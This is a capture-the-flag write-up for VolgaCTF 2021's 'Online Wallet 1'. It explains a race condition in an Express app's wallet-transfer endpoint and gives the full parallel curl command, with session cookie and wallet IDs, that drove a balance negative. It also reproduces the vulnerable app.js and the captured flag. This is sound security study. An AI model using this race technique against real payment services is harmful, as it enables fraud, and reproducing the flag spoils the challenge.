---
layout: post
title: "[VolgaCTF 2021] Online Wallet 1"
author: disna
---

# Online Wallet 1

## Outline
- Introduction
- Process
- Solution
- Flag
- Appendix

## Introduction
The challenge prompt tells us to withdraw money from our account, so that seems like how we're going to get our flag. We're also given an app.js file which contains the source code of their backend Express server.

## Process

```js
app.post('/withdraw', async (req, res) => {
  if(!req.session.userid || !req.body.wallet || (typeof(req.body.wallet) != "string"))
    return res.json({success: false})

  const db = await pool.awaitGetConnection()
  try {
    result = await db.awaitQuery("SELECT `balance` FROM `wallets` WHERE `id` = ? AND `user_id` = ?", [req.body.wallet, req.session.userid])
    /* only developers can have a negative balance */
    if((result[0].balance > 150) || (result[0].balance < 0))
      res.json({success: true, money: FLAG})
    else
      res.json({success: false})
  } catch {
    res.json({success: false})
  } finally {
    db.release()
  }
})
```

Seems like we have to either push the balance of some wallet above 150, or below 0. After toying around, making wallets and delving into all sorts of dead ends, I was left investigating this bit of code that handles the transfer logic between different wallets within an account:

```js
app.post('/transfer', async (req, res) => {
  if(!req.session.userid || !req.body.from_wallet || !req.body.to_wallet || (req.body.from_wallet == req.body.to_wallet) || !req.body.amount 
    || (typeof(req.body.from_wallet) != "string") || (typeof(req.body.to_wallet) != "string") || (typeof(req.body.amount) != "number") || (req.body.amount <= 0))
    return res.json({success: false})

  const db = await pool.awaitGetConnection()
  try {
    await db.awaitBeginTransaction()

    from_wallet = await db.awaitQuery("SELECT `balance` FROM `wallets` WHERE `id` = ? AND `user_id` = ? FOR UPDATE", [req.body.from_wallet, req.session.userid])
    to_wallet = await db.awaitQuery("SELECT `balance` FROM `wallets` WHERE `id` = ? AND `user_id` = ? FOR UPDATE", [req.body.to_wallet, req.session.userid])
    if (from_wallet.length == 0 || to_wallet.length == 0) 
      return res.json({success: false})
    from_balance = from_wallet[0].balance

    if(from_balance >= req.body.amount) {
      transaction = await db.awaitQuery("INSERT INTO `transactions` (`transaction`) VALUES (?)", [req.rawBody])
      await db.awaitQuery("UPDATE `wallets`, `transactions` SET `balance` = `balance` - `transaction`->>'$.amount' WHERE `wallets`.`id` = `transaction`->>'$.from_wallet' AND `transactions`.`id` = ?", [transaction.insertId])
      await db.awaitQuery("UPDATE `wallets`, `transactions` SET `balance` = `balance` + `transaction`->>'$.amount' WHERE `wallets`.`id` = `transaction`->>'$.to_wallet' AND `transactions`.`id` = ?", [transaction.insertId])
      await db.awaitCommit()
      res.json({success: true})
    } else {
      await db.awaitRollback()
      res.json({success: false})
    }
  } catch {
    await db.awaitRollback()
    res.json({success: false})
  } finally {
    db.release()
  }
})
```

We see that first, this function does two queries (from_wallet and to_wallet) which contain the `FOR UPDATE` SQL clause. Popping a Goog tells us that these queries lock the database table while they are doing the query.

After these queries, the function checks if there is enough balance in the origin wallet to transfer, and if there is, it updates the wallets.

Looks like a race condition. We could have a wallet with 10ντ in it, and 20 parallel executions of this function could each observe that there is at least 1vt in this wallet. Then they all do their updates, which could push the balance of this wallet to the negatives.

Okay, gotta figure out how to actually send these parallel cURL requests. I transfer 1ντ from one wallet to another while inside Burp's proxy browser, and I copy the cURL command for it from the HTTP history tab.

## Solution

https://stackoverflow.com/questions/46362284/run-multiple-curl-commands-in-parallel/46362380\

``` seq 1 200 | xargs -n1 -P10  curl "http://localhost:5000/example" ```

This code snippet taught me how to run multiple cURL commands in parallel. I slightly modified this command (make all requests parallel):

``` seq 1 200 | xargs -n1 -P200  <paste cURL command in here> ```

and ran it a couple (tens or hundreds) of times, refilling the origin wallet manually after unsuccessful attempts. Most of the time this didn't really work (no change to total balance), but maybe if I kept this up something could come out of it. The race condition seems to be possible to achieve in theory...

Well, repeating the same thing over and over and hoping for the outcome to change paid off! One of my wallets suddenly had -11ντ, and I withdrew money from it for sweet flag. Kek.

## Flag

VolgaCTF{3723759ca308887d334afe8074ec9c23}

## Appendix

Here's the full command I ended up using:
```bash
seq 1 200 | xargs -n1 -P200 curl -i -s -k -X $'POST'     -H $'Host: wallet.volgactf-task.ru' -H $'Connection: close' -H $'Content-Length: 112' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36' -H $'Content-Type: application/json' -H $'Accept: /' -H $'Origin: https://wallet.volgactf-task.ru/' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: https://wallet.volgactf-task.ru/wallet' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Cookie: connect.sid=s%3AnY457Gv1Fn1zxAKMFgNkwPzwKsewm_vQ.YG3KQTSoxvC5MFVTWcB2Ji9xmiiNQWCHnKMfAd2JlGg'     -b $'connect.sid=s%3AnY457Gv1Fn1zxAKMFgNkwPzwKsewm_vQ.YG3KQTSoxvC5MFVTWcB2Ji9xmiiNQWCHnKMfAd2JlGg'     --data-binary $'{"from_wallet":"0xb287266695c23e0b2539bbd1c10f1fbf","to_wallet":"0xbf8a0c757b9ea9d4e68c70cf49de78b9","amount":1}'     $'https://wallet.volgactf-task.ru/transfer'
```

Things I tried:
- SQL Injections: TIL that parameterized SQL queries like the ones in this challenge protect against SQL Injections.

- BodyParser's rawBody field: Just a copy of the request body in string format. Trying to get parts of the code to parse the request body and the rawBody field differently didn't really work either.

- Duplicate keys in request body to float a larger-than-allowed transfer by: Nope. Server always chose last occuring key.

And here's the entire app.js file:
```js
const express    = require('express')
const bodyParser = require('body-parser')
const mysql      = require(`mysql-await`)
const session    = require('express-session')
const cookieParser = require("cookie-parser")

const pool = mysql.createPool({
  connectionLimit: 50,
  host     : 'localhost',
  user     : '***REDACTED***',
  password : '***REDACTED***',
  database : '***REDACTED***'
})

const app = express()
app.set('strict routing', true)
app.set('view engine', 'ejs')

const rawBody = function (req, res, buf, encoding) {
  if (buf && buf.length) {
    req.rawBody = buf.toString(encoding || 'utf8')
  }
}

app.use(bodyParser.json({verify: rawBody}))
app.use(cookieParser())

app.use(session({
  secret: '***REDACTED***',
  resave: false,
  saveUninitialized: false,
  proxy: true,
  cookie: {
    sameSite: 'none',
    secure: true
  }
}))

app.use(function (req, res, next) {
  if(req.cookies.lang && typeof(req.cookies.lang) == "string")
    req.session.lang = req.cookies.lang


  if(req.query.lang && typeof(req.query.lang) == "string") {
    res.cookie('lang', req.query.lang)
    req.session.lang = req.query.lang
  }

  if(!req.session.lang) 
    req.session.lang = "en"
  next()
});

app.get('/', (req, res) => {
  if(req.session.userid)
    return res.redirect('/wallet')
  res.render('index', {lang: req.session.lang})
})

app.get('/login', (req, res) => {
  if(req.session.userid)
    return res.redirect('/wallet')
  res.render('login', {lang: req.session.lang})
})

app.post('/login', async (req, res) => {
  if(!req.body.login || !req.body.password || (typeof(req.body.login) != "string") || (typeof(req.body.password) != "string") || (req.body.password.length < 8))
    return res.json({success: false})
  const db = await pool.awaitGetConnection()
  try {
    result = await db.awaitQuery("SELECT `id` FROM `users` WHERE `login` = ? AND `password` = ? LIMIT 1", [req.body.login, req.body.password])
    req.session.userid = result[0].id
    res.json({success: true})
  } catch {
    res.json({success: false})
  } finally {
    db.release()
  }
})

app.get('/signup', (req, res) => {
  if(req.session.userid)
    return res.redirect('/wallet')
  res.render('signup', {lang: req.session.lang})
})

app.post('/signup', async (req, res) => {
  if(!req.body.login || !req.body.password || (typeof(req.body.login) != "string") || (typeof(req.body.password) != "string") || (req.body.password.length < 8))
    return res.json({success: false})

  const db = await pool.awaitGetConnection()
  try {
    result = await db.awaitQuery("SELECT `id` FROM `users` WHERE `login` = ?", [req.body.login])
    if (result.length != 0) 
      return res.json({success: false})
    result = await db.awaitQuery("INSERT INTO `users` (`login`, `password`) VALUES (?, ?)", [req.body.login, req.body.password])
    req.session.userid = result.insertId
    db.awaitQuery("INSERT INTO `wallets` (`id`, `title`, `balance`, `user_id`) VALUES (?, 'Default Wallet', 100, ?)", [`0x${[...Array(32)].map(i=>(~~(Math.random()*16)).toString(16)).join('')}`, result.insertId])
    return res.json({success: true})
  } catch {
    return res.json({success: false})
  } finally {
    db.release()
  }
})

app.get('/wallet', async (req, res) => {
  if(!req.session.userid)
    return res.redirect('/')
  const db = await pool.awaitGetConnection()
  wallets = await db.awaitQuery("SELECT * FROM `wallets` WHERE `user_id` = ?", [req.session.userid])
  result = await db.awaitQuery("SELECT SUM(`balance`) AS `sum` FROM `wallets` WHERE `user_id` = ?", [req.session.userid])
  db.release()
  res.render('wallet', {wallets, sum: result[0].sum, lang: req.session.lang})
})

app.post('/transfer', async (req, res) => {
  if(!req.session.userid || !req.body.from_wallet || !req.body.to_wallet || (req.body.from_wallet == req.body.to_wallet) || !req.body.amount 
    || (typeof(req.body.from_wallet) != "string") || (typeof(req.body.to_wallet) != "string") || (typeof(req.body.amount) != "number") || (req.body.amount <= 0))
    return res.json({success: false})

  const db = await pool.awaitGetConnection()
  try {
    await db.awaitBeginTransaction()

    from_wallet = await db.awaitQuery("SELECT `balance` FROM `wallets` WHERE `id` = ? AND `user_id` = ? FOR UPDATE", [req.body.from_wallet, req.session.userid])
    to_wallet = await db.awaitQuery("SELECT `balance` FROM `wallets` WHERE `id` = ? AND `user_id` = ? FOR UPDATE", [req.body.to_wallet, req.session.userid])
    if (from_wallet.length == 0 || to_wallet.length == 0) 
      return res.json({success: false})
    from_balance = from_wallet[0].balance

    if(from_balance >= req.body.amount) {
      transaction = await db.awaitQuery("INSERT INTO `transactions` (`transaction`) VALUES (?)", [req.rawBody])
      await db.awaitQuery("UPDATE `wallets`, `transactions` SET `balance` = `balance` - `transaction`->>'$.amount' WHERE `wallets`.`id` = `transaction`->>'$.from_wallet' AND `transactions`.`id` = ?", [transaction.insertId])
      await db.awaitQuery("UPDATE `wallets`, `transactions` SET `balance` = `balance` + `transaction`->>'$.amount' WHERE `wallets`.`id` = `transaction`->>'$.to_wallet' AND `transactions`.`id` = ?", [transaction.insertId])
      await db.awaitCommit()
      res.json({success: true})
    } else {
      await db.awaitRollback()
      res.json({success: false})
    }
  } catch {
    await db.awaitRollback()
    res.json({success: false})
  } finally {
    db.release()
  }
})

app.post('/wallet', async (req, res) => {
  if(!req.session.userid || !req.body.wallet || (typeof(req.body.wallet) != "string"))
    return res.json({success: false})

  const db = await pool.awaitGetConnection()
  try {
    db.awaitQuery("INSERT INTO `wallets` (`id`, `title`, `balance`, `user_id`) VALUES (?, ?, 0, ?)", [`0x${[...Array(32)].map(i=>(~~(Math.random()*16)).toString(16)).join('')}`, req.body.wallet, req.session.userid])
    res.json({success: true})
  } catch {
    res.json({success: false})
  } finally {
    db.release()
  }
})

app.post('/withdraw', async (req, res) => {
  if(!req.session.userid || !req.body.wallet || (typeof(req.body.wallet) != "string"))
    return res.json({success: false})

  const db = await pool.awaitGetConnection()
  try {
    result = await db.awaitQuery("SELECT `balance` FROM `wallets` WHERE `id` = ? AND `user_id` = ?", [req.body.wallet, req.session.userid])
    /* only developers can have a negative balance */
    if((result[0].balance > 150) || (result[0].balance < 0))
      res.json({success: true, money: FLAG})
    else
      res.json({success: false})
  } catch {
    res.json({success: false})
  } finally {
    db.release()
  }
})

app.get('/logout', (req, res) => {
  req.session.destroy()
  res.redirect('/')
})

const PORT = 8080
const FLAG = "VolgaCTF{***REDACTED***}"

app.listen(PORT, () => {
  console.log(`App listening on port ${PORT}`)
})
```
